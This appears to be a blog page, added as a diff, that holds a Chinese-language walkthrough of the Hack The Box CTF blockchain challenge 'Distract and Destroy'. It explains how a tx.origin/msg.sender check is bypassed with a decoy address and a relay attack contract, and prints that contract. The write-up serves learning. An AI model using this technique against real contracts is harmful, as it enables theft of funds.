@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="desktop" > 
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+
+  
+  <title>htb—ctf-blockchain/Distract_and Destroy | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="初始化创建了一个Creature的类，加以调用，这个部分没啥 1234567891011121314151617&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.13;import &#123;Creature&#125; from &quot;.&#x2F;Creature.sol&quot;;contract Setup &#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="htb—ctf-blockchain&#x2F;Distract_and Destroy">
+<meta property="og:url" content="http://example.com/2024/02/20/ctf-blockchain-1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="初始化创建了一个Creature的类，加以调用，这个部分没啥 1234567891011121314151617&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.13;import &#123;Creature&#125; from &quot;.&#x2F;Creature.sol&quot;;contract Setup &#123;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/wpimages/2024/ctf/blockchain/1/92463499_p0.png">
+<meta property="article:published_time" content="2024-02-20T09:20:42.000Z">
+<meta property="article:modified_time" content="2024-02-22T12:27:30.084Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="blockchain">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/wpimages/2024/ctf/blockchain/1/92463499_p0.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/backgroup.jpg" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Hexo </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/images/avatar.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Flower </div>
+      <div class="dot"></div>
+      <div class="subtitle">Hi Im Flower </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+    
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+    </div>
+  </div>
+
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/Sherlocks/">
+                Sherlocks
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/ctf/">
+                ctf
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-4/">
+                htb-Season-4
+                <div class="category-count">1</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2024/02/20/ctf-blockchain-1/" title="htb—ctf-blockchain/Distract_and Destroy" >
+            <div class="recent-link-text">
+              htb—ctf-blockchain/Distract_and Destroy
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/19/box-office-wp/" title="【season-4】htb office wp" >
+            <div class="recent-link-text">
+              【season-4】htb office wp
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/13/test/" title="【Sherlocks圣诞节特辑】htb OpTinselTrace-4 wp" >
+            <div class="recent-link-text">
+              【Sherlocks圣诞节特辑】htb OpTinselTrace-4 wp
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-ctf-blockchain-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+<div class="article-gallery">
+  <div class="article-gallery-photos">
+    
+      <a class="article-gallery-img" rel="gallery_clsx77x5700027sky3nfl2zou">
+        <img src="/wpimages/2024/ctf/blockchain/1/92463499_p0.png" itemprop="image">
+      </a>
+    
+  </div>
+</div>
+
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        htb—ctf-blockchain/Distract_and Destroy
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2024-02-20T09:20:42.000Z" itemprop="datePublished">2024-02-20</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/ctf/">ctf</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            6.5k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <p>初始化<br>创建了一个Creature的类，加以调用，这个部分没啥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &#123;Creature&#125; from <span class="string">&quot;./Creature.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract Setup &#123;</span><br><span class="line">    Creature public immutable TARGET;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        TARGET = new Creature&#123;value: 10&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> isSolved() public view returns (bool) &#123;</span><br><span class="line">        <span class="built_in">return</span> address(TARGET).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要关注的的是这个类</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Creature.sol</span><br><span class="line"></span><br><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Creature &#123;</span><br><span class="line">    uint256 public lifePoints;</span><br><span class="line">    address public aggro;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        lifePoints = 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> attack(uint256 _damage) external &#123;</span><br><span class="line">        <span class="keyword">if</span> (aggro == address(0)) &#123;</span><br><span class="line">            aggro = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_isOffBalance() &amp;&amp; aggro != msg.sender) &#123;</span><br><span class="line">            lifePoints -= _damage;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            lifePoints -= 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> loot() external &#123;</span><br><span class="line">        require(lifePoints == 0, <span class="string">&quot;Creature is still alive!&quot;</span>);</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> _isOffBalance() private view returns (bool) &#123;</span><br><span class="line">        <span class="built_in">return</span> tx.origin != msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里它给一个变量赋值了1000，也就是游戏里怪物的血量，在初始化类中它直接调用的这里创建了一个1000hp的怪物。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">constructor() payable &#123;</span><br><span class="line">      lifePoints = 1000;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>然后是攻击部分，这里函数允许接受一个uint256的数字变量</p>
+<p>这里在初次调用<code>attack()</code>时，首先判断aggro是否为空，如为空则将<strong>第一个攻击函数调用者的地址</strong>赋予它。</p>
+<p>这里可以把aggro看作是生物的仇恨目标，<em><strong>谁先发起攻击，他就一直仇恨谁。</strong></em></p>
+<p>在之后的判断的逻辑中需要满足，后来攻击者的地址不能等于第一个攻击者的地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> attack(uint256 _damage) external &#123;</span><br><span class="line">       <span class="keyword">if</span> (aggro == address(0)) &#123;</span><br><span class="line">           aggro = msg.sender;</span><br><span class="line">       &#125;</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure>
+<p>其次是主要攻击部分，这里引入了一个_isOffBalance()函数返回布尔，当达成条件时</p>
+<p>即可让lifePointes减少对应的hp也就是_damage变量<code>lifePoints -= _damage</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (_isOffBalance() &amp;&amp; aggro != msg.sender) &#123;</span><br><span class="line">        lifePoints -= _damage;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        lifePoints -= 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当满足_isOffBalance()以及用正常地址调用合约时，便可减少怪物血量</p>
+<p>所以接下来看_isOffBalance()是如何构造的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> _isOffBalance() private view returns (bool) &#123;</span><br><span class="line">        <span class="built_in">return</span> tx.origin != msg.sender;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>他在这里用<code>tx.origin != msg.sender</code>做对比，当两个值不相等时便返回true</p>
+<p>这里的<code>tx.origin</code>是合约初始调用地址</p>
+<p>而<code>msg.sender</code>则是最近发送者的合约地址。</p>
+<p>用一个简单的合约调用链来看下，方便理解</p>
+<blockquote>
+<p>EOA —&gt; 合约A —&gt;合约B</p>
+</blockquote>
+<p>这里EOA是我们的原始地址</p>
+<p>举个例子，如果我们的原始合约地址是<code>0x0010</code></p>
+<p>当在调用合约A时，合约A里两个变量：</p>
+<p>msg.sender&#x3D;<code>0x0010</code></p>
+<p>tx.origin&#x3D;<code>0x0010</code></p>
+<p>此时如果我们通过合约A再调用合约B</p>
+<p>在合约B中看两个变量：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msg.sender=0x0011 <span class="comment">#&lt;-这个是合约A的合约地址</span></span><br><span class="line"></span><br><span class="line">tx.origin=0x0010</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以发现在合约B中的msg.sender变成了合约A的地址，msg.sender代表的是最近的调用者合约地址</p>
+<p>而tx.origin则是不会变的，依旧是EOA最初的地址，tx.origin代表的就是原始合约地址</p>
+<p>这是两者最显著的区别。</p>
+<p>再回过头去看这个函数，其实就是原始调用地址不能等于最近调用者的合约地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> _isOffBalance() private view returns (bool) &#123;</span><br><span class="line">        <span class="built_in">return</span> tx.origin != msg.sender;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>简单的说，不可以直接用原始合约来调用这个合约</p>
+<p>要用中间在做一层合约，去调用这个合约，即刻达成返回true，就像下面这样</p>
+<blockquote>
+<p>EOA —&gt; 合约A —&gt;合约B</p>
+</blockquote>
+<p>为此我们需要构造一个合约来利用</p>
+<p>除此之外，我们还需要关注之前的<code>aggro != msg.sender</code>也要满足</p>
+<blockquote>
+<p>至此我们现在需要满足以下几个条件，即可发起攻击：</p>
+<p>1.为满足<code>aggro != msg.sender</code>，我们需要先用一个诱饵地址去吸引仇恨</p>
+<p>2.在满足1的前提下,为满足<code>tx.origin != msg.sender</code>须通过一个新合约去调用这个游戏的合约。</p>
+</blockquote>
+<p><strong>可能有师傅条件一多就有点混了，会想用户和合约中继分别发起攻击，不分前后顺序可不可以？</strong></p>
+<p><em><strong>答案是不行</strong></em></p>
+<p>原因是，虽然不分前后顺序确实都可以满足<code>aggro != msg.sender</code>，但是却无法满足<code>tx.origin != msg.sender</code></p>
+<p>如果首先发起攻击请求的是中继合约</p>
+<p>1.aggro目标指向了中继合约用户，然后<code>aggro != msg.sender</code>false</p>
+<p>2.再EOA发起，<code>aggro != msg.sender</code>True,但是这里<code>tx.origin != msg.sender</code>会false，因为首先<code>tx.origin</code>代表的合约原始地址，<code>msg.sender</code>则是距离游戏合约最近一个调用的地址，<strong>这里因为本次调用者是EOA</strong>，导致原始调用是EOA的同时距离最近调用者也是EOA。所以俩值一毛一样了..</p>
+<p>如果顺序反过来，由EOA先调用，再调用中继合约</p>
+<p>1.aggro目标指向了EOA用户，然后<code>aggro != msg.sender</code>false</p>
+<p>2.再用中继合约，<code>tx.origin != msg.sender</code>，<code>tx.origin</code>等于原始调用者EOA，<code>msg.sender</code>等于中继合约，于是True，所以可以发起攻击。</p>
+<p><img src="/wpimages/2024/ctf/blockchain/1/ez_image.png" alt="ez_image"></p>
+<hr>
+<h3 id="中继合约构造"><a href="#中继合约构造" class="headerlink" title="中继合约构造"></a>中继合约构造</h3><p>1.首先我们要构造一个基于本游戏合约的中继合约需要引入他的对象，其实有点类似于java那种引入一个外部库的类，然后用地址将其实例化。</p>
+<p>我们先看下游戏自己的sol咋写的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Creature &#123;</span><br><span class="line">    uint256 public lifePoints;</span><br><span class="line">    address public aggro;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        lifePoints = 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> attack(uint256 _damage) external &#123;</span><br><span class="line">        <span class="keyword">if</span> (aggro == address(0)) &#123;</span><br><span class="line">            aggro = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_isOffBalance() &amp;&amp; aggro != msg.sender) &#123;</span><br><span class="line">            lifePoints -= _damage;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            lifePoints -= 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> loot() external &#123;</span><br><span class="line">        require(lifePoints == 0, <span class="string">&quot;Creature is still alive!&quot;</span>);</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> _isOffBalance() private view returns (bool) &#123;</span><br><span class="line">        <span class="built_in">return</span> tx.origin != msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我是这么写的，引入Creature.sol的Creature合约对象，然后给新合约起个名叫flower（</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> src/attc.sol </span><br><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &#123;Creature&#125; from <span class="string">&quot;./Creature.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract flower&#123;</span><br><span class="line">    Creature public creture;</span><br><span class="line"></span><br><span class="line">    constructor (Creature _creature)&#123;</span><br><span class="line">        creture = _creature;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> attackA(uint256 _damage) external&#123;</span><br><span class="line">        creture.attack(_damage);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>给了一个attck让他来执行攻击，这里再加个loot也行，但是我懒</p>
+<hr>
+<h3 id="合约构造与使用"><a href="#合约构造与使用" class="headerlink" title="合约构造与使用"></a>合约构造与使用</h3><p>1.首先用forge初始化一下合约目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ ~/tools/blockchain/forge init --force</span><br><span class="line">Target directory is not empty, but `--force` was specified</span><br><span class="line">Initializing /home/xxxx/Desktop/blockchain_distract_and_destroy...</span><br><span class="line">Installing forge-std <span class="keyword">in</span> /home/xxxx/Desktop/blockchain_distract_and_destroy/lib/forge-std (url: Some(<span class="string">&quot;https://github.com/foundry-rs/forge-std&quot;</span>), tag: None)</span><br><span class="line">    Installed forge-std v1.7.6</span><br><span class="line">    Initialized forge project</span><br></pre></td></tr></table></figure>
+
+<p>可以看到当前目录下多了不少文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ ls                                </span><br><span class="line">cache  foundry.toml  lib  out  README.md  script  src  test</span><br></pre></td></tr></table></figure>
+<p>把我们的.sol和Creature.sol一起丢到.&#x2F;src目录下</p>
+<p>2.在链上线合约</p>
